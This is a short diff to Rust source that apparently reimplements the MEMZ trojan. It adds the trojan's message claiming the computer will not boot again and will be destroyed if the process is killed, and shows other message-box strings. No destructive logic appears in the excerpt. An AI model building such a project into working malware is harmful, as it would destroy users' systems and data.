@@ -1,3 +1,6 @@
+pub const MSG: &str = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
+pub const MSG_LEN: usize = MSG.len();
+
 pub const MSGS: &[&str] = &[
     "YOU KILLED MY TROJAN!\r\nNow you are going to die.",
     "REST IN PISS, FOREVER MISS.",
@@ -26,7 +29,6 @@ pub const MSGS: &[&str] = &[
     "'This is everything I want in my computer'\r\n - danooct1 2016",
     "'Uh, Club Penguin. Time to get banned!'\r\n - danooct1 2016",
 ];
-
 pub const MSGS_LEN: usize = MSGS.len();
 
 pub const MEMZ_MSGBOXA_1: &str = "The software you just executed is considered malware.\r\n\
